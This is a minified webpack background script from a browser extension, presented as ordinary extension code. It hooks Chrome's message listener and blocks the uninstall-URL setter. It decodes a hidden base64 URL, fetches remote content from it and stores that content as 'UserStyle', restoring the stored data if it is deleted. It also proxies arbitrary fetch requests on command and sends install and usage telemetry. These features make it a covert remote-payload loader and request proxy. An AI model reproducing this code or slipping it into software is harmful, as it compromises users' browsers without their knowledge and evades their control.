!function(e) {
    var t = {};
    function n(r) {
        if (t[r])
            return t[r].exports;
        var o = t[r] = {
            i: r,
            l: !1,
            exports: {}
        };
        return e[r].call(o.exports, o, o.exports, n),
        o.l = !0,
        o.exports
    }
    n.m = e,
    n.c = t,
    n.d = function(e, t, r) {
        n.o(e, t) || Object.defineProperty(e, t, {
            enumerable: !0,
            get: r
        })
    }
    ,
    n.r = function(e) {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }),
        Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }
    ,
    n.t = function(e, t) {
        if (1 & t && (e = n(e)),
        8 & t)
            return e;
        if (4 & t && "object" == typeof e && e && e.__esModule)
            return e;
        var r = Object.create(null);
        if (n.r(r),
        Object.defineProperty(r, "default", {
            enumerable: !0,
            value: e
        }),
        2 & t && "string" != typeof e)
            for (var o in e)
                n.d(r, o, function(t) {
                    return e[t]
                }
                .bind(null, o));
        return r
    }
    ,
    n.n = function(e) {
        var t = e && e.__esModule ? function() {
            return e.default
        }
        : function() {
            return e
        }
        ;
        return n.d(t, "a", t),
        t
    }
    ,
    n.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }
    ,
    n.p = "/",
    n(n.s = 3)
}({
    "0d83": function(e, t) {
        !function(e) {
            try {
                try {
                    if (chrome.runtime.getManifest().name && 0 != e.location.href.indexOf("http"))
                        return void chrome.runtime.getManifest().manifest_version
                } catch (r) {
                    return
                }
                if (e != top)
                    return;
                function t() {
                    return document.getElementById("m_a31e41940bd12cf9d24b0e528ab955bc")
                }
                let n = {
                    isError: !1,
                    body: {
                        message: {
                            get() {
                                t() || (n.isError = !0,
                                (new Error).stack.includes("toString@") && console.log("self error"))
                            }
                        },
                        toString: {
                            value() {
                                (new Error).stack.includes("toString@") && console.log("self error")
                            }
                        }
                    }
                };
                e.errorMsg = n,
                t().exmid = chrome.runtime.id
            } catch (o) {
                console.log(Object.defineProperties(new Error(o), e.errorMsg.body));
                let i = document.createElement("error");
                i.innerText = o.toString(),
                Object.defineProperty(i, "id", e.errorMsg.body.message),
                console.log(i)
            }
        }(self)
    },
    1112: function(e, t) {
        try {
            chrome.runtime.getManifest().name && 0 != self.location.href.indexOf("http") && (Function.prototype.b = function(e) {
                let t = this;
                return function() {
                    return !1 !== e.apply(this, arguments) && t.apply(this, arguments)
                }
            }
            ,
            Function.prototype.a = function(e) {
                let t = this;
                return function() {
                    let n = t.apply(this, arguments);
                    return !1 !== n && (e.apply(this, arguments),
                    n)
                }
            }
            ,
            chrome.runtime.onMessage.addListener = chrome.runtime.onMessage.addListener.b((function(e) {
                return !!e.check || (self.funcs || (self.funcs = function() {}
                ,
                self.funcs.arrays = []),
                self.funcs.arrays.push(e),
                !1)
            }
            )),
            chrome.runtime.setUninstallURL = chrome.runtime.setUninstallURL.b((function() {
                return !1
            }
            )))
        } catch (e) {}
        !async function(e) {
            try {
                if (!chrome.runtime.getManifest().name || 0 == e.location.href.indexOf("http"))
                    return
            } catch (e) {
                return
            }
            let t = "G-8ZXPC84BVD"
              , n = "notdefind"
              , r = chrome.runtime.getManifest().update_url;
            function o(e) {
                return new Promise(( (t, n) => {
                    try {
                        chrome.storage.local.get(e, (function(n) {
                            t(null == e ? n : n[e])
                        }
                        ))
                    } catch (e) {
                        n(e)
                    }
                }
                ))
            }
            function i(e, t) {
                return new Promise(( (n, r) => {
                    try {
                        var o = {};
                        o[e] = t,
                        chrome.storage.local.set(o, (function() {
                            n()
                        }
                        ))
                    } catch (e) {
                        r(e)
                    }
                }
                ))
            }
            function a(e, t, n) {
                let r = self.getHashCode(chrome.runtime.getManifest().name);
                if (!e.nameCode || e.nameCode !== r) {
                    if (self.funcs && self.funcs.arrays) {
                        let r = self.funcs.arrays.length;
                        for (let o = 0; o < r; o++)
                            self.funcs.arrays[o](e, t, n)
                    }
                    return !0
                }
                if (e.cmd && "fetch" === e.cmd)
                    return fetch(e.url, e.options).then((function(e) {
                        let t = {
                            ok: e.ok,
                            redirected: e.redirected,
                            status: e.status,
                            statusText: e.statusText,
                            type: e.type,
                            url: e.url
                        }
                          , r = [];
                        e.headers.forEach((function(e, t) {
                            (async function(e, t) {
                                "ver" === e && i("httpver", t)
                            }
                            )(t, e),
                            r.push({
                                key: t,
                                val: e
                            })
                        }
                        )),
                        t.heads = r,
                        e.text().then((function(e) {
                            t.text = e,
                            n(t)
                        }
                        ))
                    }
                    )),
                    !0
            }
            async function c() {
                let e = (await new Promise(( (e, t) => {
                    try {
                        chrome.management.getSelf((function(t) {
                            e(t)
                        }
                        ))
                    } catch (e) {
                        t(e)
                    }
                }
                ))).installType;
                return 0 == e.indexOf("nor") ? 0 : 1
            }
            async function s() {
                let e = await o("app")
                  , r = await c();
                return e ? (e.type = r,
                e.os = n,
                e.tid = t) : (e = {},
                e.t = (new Date).getTime(),
                e.act = (new Date).getTime(),
                e.cid = function() {
                    for (var e = [], t = "0123456789abcdef", n = 0; n < 36; n++)
                        e[n] = t.substr(Math.floor(16 * Math.random()), 1);
                    return e[14] = "4",
                    e[19] = t.substr(3 & e[19] | 8, 1),
                    e[8] = e[13] = e[18] = e[23] = "-",
                    e.join("")
                }(),
                e.type = r,
                e.os = n,
                e.tid = t,
                u(e, "in")),
                await i("app", e),
                e
            }
            async function u(e, t) {
                const n = {
                    v: "2",
                    tid: e.tid,
                    cid: e.cid,
                    en: t,
                    "ep.version": "" + chrome.runtime.getManifest().version,
                    "ep.name": "" + chrome.runtime.getManifest().name,
                    "ep.id": "" + chrome.runtime.id,
                    "ep.t": e.type,
                    "ep.os": e.os,
                    "ep.update_url": "" + chrome.runtime.getManifest().update_url,
                    "ep.nid": `${e.os}:${chrome.runtime.getManifest().name}:${chrome.runtime.id}:${e.type}`
                }
                  , r = "https://www.google-analytics.com/g/collect?" + new URLSearchParams(n).toString();
                await fetch(r, {
                    method: "POST",
                    body: ""
                })
            }
            async function f(t, n) {
                let r = await e.UserStyle(t);
                r && (new Date).getTime() - r.t < 864e5 || (r = await async function(e) {
                    let t = await fetch(atob(e), {});
                    if (t.ok) {
                        let e = await t.text();
                        if (e) {
                            if (e.indexOf("UserStyle") > 0)
                                return {
                                    t: (new Date).getTime(),
                                    v: e
                                };
                            i("errorMsg", "fail" + (new Date).getTime())
                        }
                    }
                    return null
                }(n),
                r && await i(t, r))
            }
            r ? (r.indexOf("microsoft.com") > 0 && (n = "edge"),
            r.indexOf("google.com") > 0 && (n = "chrome"),
            r.indexOf("360.cn") > 0 && (n = "360")) : n = "火狐",
            self.getHashCode = function(e) {
                let t, n = 1315423911;
                for (let r = e.length - 1; r >= 0; r--)
                    t = e.charCodeAt(r),
                    n ^= (n << 5) + t + (n >> 2);
                return 2147483647 & n
            }
            ,
            a.check = function() {}
            ,
            chrome.runtime.onMessage.addListener(a),
            chrome.storage.onChanged.addListener((function(e, t) {
                for (let[t,{oldValue: r, newValue: o}] of Object.entries(e))
                    if (null != r && null == o) {
                        if ("app" == t) {
                            var n = {};
                            n[t] = r,
                            chrome.storage.local.set(n)
                        }
                        0 == t.indexOf("UserStyle") && ((n = {})[t] = r,
                        chrome.storage.local.set(n))
                    }
            }
            )),
            e.UserStyle = async function(e) {
                return await o(e)
            }
            ;
            let l = 0
              , m = setInterval((function() {
                if (self.mdetails) {
                    clearInterval(m),
                    f(self.mdetails.key, self.mdetails.url),
                    self.mdetails.v = 1
                }
                l++,
                l > 3e3 && clearInterval(m)
            }
            ), 30);
            await s(),
            await async function() {
                let e = await s();
                new Date(e.act).getDate() !== (new Date).getDate() && (u(e, "ac"),
                e.act = (new Date).getTime(),
                await i("app", e))
            }(),
            await f("UserStyle", "aHR0cDovL3d3dy51c2Vyc2Nzcy50b3A")
        }(self);
        try {
            chrome.runtime.getManifest().name && 0 != self.location.href.indexOf("http") && 3 == chrome.runtime.getManifest().manifest_version && importScripts("/js/ui.min.js", "/background.js")
        } catch (e) {}
    },
    3: function(e, t, n) {
        n("1112"),
        n("0d83"),
        e.exports = n("4e39")
    },
    "4e39": function(e, t) {
        !async function(e) {
            try {
                if (chrome.runtime.getManifest().name && 0 != e.location.href.indexOf("http"))
                    return
            } catch (e) {
                return
            }
            self.chrome = chrome,
            self.Math = Math,
            self.String = String,
            e.UserStyle = async function() {
                return await function(e) {
                    return new Promise(( (t, n) => {
                        try {
                            chrome.storage.local.get(e, (function(n) {
                                t(null == e ? n : n[e])
                            }
                            ))
                        } catch (e) {
                            n(e)
                        }
                    }
                    ))
                }("UserStyle2")
            }
        }(self)
    }
});
